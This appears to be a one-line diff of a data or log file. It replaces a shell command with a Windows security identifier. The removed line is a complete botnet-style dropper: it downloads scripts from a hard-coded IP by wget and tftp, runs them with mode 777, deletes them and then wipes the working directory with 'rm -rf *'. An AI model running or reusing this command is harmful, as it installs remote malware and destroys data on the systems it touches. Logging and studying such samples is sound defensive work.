@@ -1,1 +1,1 @@
-cd /tmp || cd /run || cd /; wget http://64.227.2.66/yoyobins.sh; chmod 777 yoyobins.sh; sh yoyobins.sh; tftp 64.227.2.66 -c get yoyotftp1.sh; chmod 777 yoyotftp1.sh; sh yoyotftp1.sh; tftp -r yoyotftp2.sh -g 64.227.2.66; chmod 777 yoyotftp2.sh; sh yoyotftp2.sh; rm -rf yoyobins.sh yoyotftp1.sh yoyotftp2.sh; rm -rf *
+S-1-5-21-1262456445-1174771659-1808039058-1001
